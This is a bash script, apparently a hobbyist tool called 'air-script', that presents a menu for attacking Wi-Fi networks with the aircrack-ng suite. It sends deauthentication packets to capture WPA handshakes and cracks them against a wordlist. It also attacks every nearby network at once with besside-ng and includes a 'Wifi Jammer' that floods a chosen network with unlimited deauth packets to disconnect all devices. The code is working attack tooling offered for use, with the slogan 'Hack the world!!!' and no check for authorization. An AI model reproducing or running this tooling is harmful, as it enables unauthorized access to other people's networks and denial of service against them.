#!/bin/bash

clear
Red="\e[1;91m"      ##### Colors Used #####
Green="\e[0;92m"
Yellow="\e[0;93m"
Blue="\e[1;94m"
White="\e[0;97m"

handshakeWait=2        ##### Time, how long aircack-ng waits for handshake in minute #####

checkDependencies () {        ##### Check if aircrack-ng is installed or not #####
if [ $(dpkg-query -W -f='${Status}' aircrack-ng 2>/dev/null | grep -c "ok installed") -eq 0 ]; then
echo "Installing aircrack-ng\n\n"
sudo apt-get install aircrack-ng;
fi
}

checkWiFiStatus () {        ##### Check if wlan0 is enabled or not #####
WiFiStatus=`nmcli radio wifi`
if [ "$WiFiStatus" == "disabled" ]; then
nmcli radio wifi on
echo -e "[${Green}wlan0${White}] Enabled!"
fi
}

banner () {        ##### Banner #####
echo -e "${Red}
 ▄▄▄       ██▓ ██▀███                            
▒████▄    ▓██▒▓██ ▒ ██▒                          
▒██  ▀█▄  ▒██▒▓██ ░▄█ ▒                          
░██▄▄▄▄██ ░██░▒██▀▀█▄                            
 ▓█   ▓██▒░██░░██▓ ▒██▒                          
 ▒▒   ▓▒█░░▓  ░ ▒▓ ░▒▓░                          
  ▒   ▒▒ ░ ▒ ░  ░▒ ░ ▒░                          
  ░   ▒    ▒ ░  ░░   ░                           
      ░  ░ ░     ░                               
                                                 
  ██████  ▄████▄   ██▀███   ██▓ ██▓███  ▄▄▄█████▓
▒██    ▒ ▒██▀ ▀█  ▓██ ▒ ██▒▓██▒▓██░  ██▒▓  ██▒ ▓▒
░ ▓██▄   ▒▓█    ▄ ▓██ ░▄█ ▒▒██▒▓██░ ██▓▒▒ ▓██░ ▒░
  ▒   ██▒▒▓▓▄ ▄██▒▒██▀▀█▄  ░██░▒██▄█▓▒ ▒░ ▓██▓ ░ 
▒██████▒▒▒ ▓███▀ ░░██▓ ▒██▒░██░▒██▒ ░  ░  ▒██▒ ░ 
▒ ▒▓▒ ▒ ░░ ░▒ ▒  ░░ ▒▓ ░▒▓░░▓  ▒▓▒░ ░  ░  ▒ ░░   
░ ░▒  ░ ░  ░  ▒     ░▒ ░ ▒░ ▒ ░░▒ ░         ░    
░  ░  ░  ░          ░░   ░  ▒ ░░░         ░      
      ░  ░ ░         ░      ░                    
         ░                                  "
echo -e "${Yellow} \n             Hack the world!!!
      By using this you agree to the EULA."
echo -e "${Green}\n                    Developed by: Liam Bendix"
echo -e "${Green}                         Version: 1.0 Stable"
}

menu () {        ##### Display available options #####
echo -e "\n${Yellow}                      [ Select Option To Continue ]\n\n"
echo -e "      ${Red}[${Blue}1${Red}] ${Green}Hack A Wifi Network"
echo -e "      ${Red}[${Blue}2${Red}] ${Green}Hack All Wifi Networks"
echo -e "      ${Red}[${Blue}3${Red}] ${Green}Decrypt Passowrd(s)"
echo -e "      ${Red}[${Blue}4${Red}] ${Green}Wifi Jammer"
echo -e "      ${Red}[${Blue}5${Red}] ${Green}View log file"
echo -e "      ${Red}[${Blue}6${Red}] ${Green}Help"
echo -e "      ${Red}[${Blue}7${Red}] ${Green}Exit\n\n"
while true; do
echo -e "${Green}┌─[${Red}Select Option${Green}]──[${Red}~${Green}]─[${Yellow}Menu${Green}]:"
read -p "└─────►$(tput setaf 7) " option
case $option in
  1) echo -e "\n[${Green}Selected${White}] Option 1 Hack A Wifi Network"
     wifiHacking
     ;;
  2) echo -e "\n[${Green}Selected${White}] Option 2 Hack All Wifi Networks"
     attackAll
     exit 0
     ;;
  3) echo -e "\n[${Green}Selected${White}] Option 3 Decrypt Passowrd(s)"
     crack
     exit 0
     ;;
  4) echo -e "\n[${Green}Selected${White}] Option 4 Wifi Jammer"
     wifiJammer
     exit 0
     ;;
  5) echo -e "\n[${Green}Selected${White}] View log file"
     log
     exit 0
     ;;
  6) echo -e "\n[${Green}Selected${White}] Help"
     Help
     exit 0
     ;;
  7) echo -e "${Red}\n\033[1mThank You for using the script,\nHappy Hacking :)\n"
     exit 0
     ;;
  *) echo -e "${White}[${Red}Error${White}] Please select correct option...\n"
     ;;
esac
done
}

wifiHacking () {        ##### Sending DeAuth and capture handshake #####
./raspberry.sh
monitor
airodump-ng --bssid $bssid --channel $channel --output-format pcap --write handshake wlan0mon > /dev/null &
echo -e "[${Green}wlan0mon${White}] Sending DeAuth to target..."
x-terminal-emulator -e aireplay-ng --deauth 20 -a $bssid wlan0mon
wordlist
echo -e "[${Green}Status${White}] Waiting for Handshake Packet..."
counter=0
while true; do
sleep 10
echo -e "[${Green}Status${White}] Checking for Handshake Packet..."
aircrack-ng -w $fileLocation handshake-01.cap > logs/password 2> logs/error
if [ $? -eq 0 ] || [ $counter -eq $(($handshakeWait*3)) ]; then
break
fi
sleep 10
echo -e "[${Red}!${White}] Can't find Handshake, waiting ..."
counter=$((counter+1))
done
kill $!
airmon-ng stop wlan0mon > /dev/null
rm handshake-01.cap
if grep "unable" logs/error > /dev/null; then
echo -e "[${Red}$targetName${White}] Exiting can't find Handshake Packet..."
sleep 0.5
echo -e "[${Yellow}Warning${White}] Make sure at least one client is connected to network..."
exit 1
elif grep "NOT" logs/password > /dev/null; then
echo -e "[${Green}$targetName${White}] Captured Handshake..."
sleep 0.5
echo -e "[${Red}$targetName${White}] Can't find password..."
sleep 0.5
echo -e "[${Yellow}Warning${White}] Try using custom wordlist..."
exit 1
elif grep "FOUND!" logs/password > /dev/null; then
key=$(grep "FOUND!" logs/password | cut -d " " -f4 | uniq)
echo -e "[${Green}$targetName${White}] Captured Handshake..."
sleep 0.5
echo -e "[${Green}$targetName${White}] Password for network is: \e[4;97m$key${White}\n"
exit 0
else
echo -e "[${Red}!${White}] Unknown error is occured..."
sleep 0.5
echo -e "[${Yellow}GitHub${White}] You can email me @ liam@liambendix.com"
echo -e "[${Yellow}GitHub${White}] Please send a copy of password and error log files..."
exit 1
fi
}

wordlist () {        ##### Enter path to wordlist or use default #####
read -p $'[\e[0;92mInput\e[0;97m] Path to wordlist (Press enter to use default): ' fileLocation
if [ -z "$fileLocation" ]; then
fileLocation="${parameter:-dictionary/defaultWordList.txt}"
return 0
elif [[ -f "$fileLocation" ]]; then
return 0
fi
echo -e "[${Red}!$White] File doesn't exist..."
wordlist
}


attackAll() {
./raspberry2.sh
sudo airmon-ng check kill
sudo airmon-ng
sudo airmon-ng start wlan0
besside-ng wlam0mon
besside-ng wlan0mon
airmon-ng stop wlan0mon
ifconfig wlan0 up
systemctl start NetworkManager
}

crack() {
wordlist
aircrack-ng -w wordlist.txt wep.cap
aircrack-ng -w wordlist.txt wpa.cap
}



wifiJammer () {        ##### Sending unlimited DeAuth #####
monitor
airodump-ng --bssid $bssid --channel $channel wlan0mon > /dev/null & sleep 5 ; kill $!  
echo -e "[${Green}${targetName}${White}] DoS started, all devices disconnected... "
sleep 0.5
echo -e "[${Green}DoS${White}] Press ctrl+c to stop attack & exit..."
aireplay-ng --deauth 0 -a $bssid wlan0mon > /dev/null
}

monitor () {        ##### Monitor mode, scan available networks & select target #####
spinner &
airmon-ng start wlan0 > /dev/null
trap "airmon-ng stop wlan0mon > /dev/null;rm generated-01.kismet.csv handshake-01.cap 2> /dev/null" EXIT
airodump-ng --output-format kismet --write generated wlan0mon > /dev/null & sleep 20 ; kill $!
sed -i '1d' generated-01.kismet.csv
kill %1
airmon-ng stop wlan0mon
echo -e "\n\n${Red}SerialNo        WiFi Network${White}"
cut -d ";" -f 3 generated-01.kismet.csv | nl -n ln -w 8
targetNumber=1000
while [ ${targetNumber} -gt `wc -l generated-01.kismet.csv | cut -d " " -f 1` ] || [ ${targetNumber} -lt 1 ]; do 
echo -e "\n${Green}┌─[${Red}Select Target${Green}]──[${Red}~${Green}]─[${Yellow}Network${Green}]:"
read -p "└─────►$(tput setaf 7) " targetNumber
done
airmon-ng start wlan0
targetName=`sed -n "${targetNumber}p" < generated-01.kismet.csv | cut -d ";" -f 3 `
bssid=`sed -n "${targetNumber}p" < generated-01.kismet.csv | cut -d ";" -f 4 `
channel=`sed -n "${targetNumber}p" < generated-01.kismet.csv | cut -d ";" -f 6 `
rm generated-01.kismet.csv 2> /dev/null
echo -e "\n[${Green}${targetName}${White}] Preparing for attack..."
}

log(){
cat besside.log
}

spinner() {        ##### Animation while scanning for available networks #####
sleep 2
echo -e "[${Green}wlan0mon${White}] Preparing for scan..."
sleep 3
spin='/-\|'
length=${#spin}
while sleep 0.1; do
echo -ne "[${Green}wlan0mon${White}] Scanning for available networks...${spin:i--%length:1}" "\r"
done
}

Help()
{        ##### Display available options #####
echo -e "\n${Yellow}                      [ Select Option To Continue ]\n\n"
echo -e "      ${Red}[${Blue}1${Red}] ${Green}How to set up for mobile"
echo -e "      ${Red}[${Blue}2${Red}] ${Green}Its not working :("
echo -e "      ${Red}[${Blue}3${Red}] ${Green}Exit\n\n"
while true; do
echo -e "${Green}┌─[${Red}Select Option${Green}]──[${Red}~${Green}]─[${Yellow}Menu${Green}]:"
read -p "└─────►$(tput setaf 7) " option
case $option in
  1) echo -e "\n[${Green}Selected${White}] How to set up mobile?"
     instructions
     exit 0
     ;;
  2) echo -e "\n[${Green}Selected${White}] Fix this shit.."
     fix
     exit 0
     ;; 
  3) echo -e "\n[${Green}Selected${White}] Going back.."
     exit 0
     ;;
  *) echo -e "${White}[${Red}Error${White}] Please select correct option...\n"
     ;;
esac
done
}

instructions(){

echo "$(tput setaf 2)INSTRUCTIONS:

METHOD 1: (SSH/AD HOC METHOD)

Step 1: Once established connection to Pi via Hotspot or Ad Hoc
run command "sudo ./air-script.sh"
Step 2: Select an attack
--------------------------------------------------

METHOD 2:

With Raspberry Pi using screen, mouse and keyboard:
You can use method one, without the need of SSH or Ad Hoc. "
}

fix(){
apt-get update
apt-get install aircrack-ng
echo "$(tput setaf 2)Fixing.. reboot recommended when finished."


}

targeted () {
checkDependencies
checkWiFiStatus
banner
menu
}

targeted
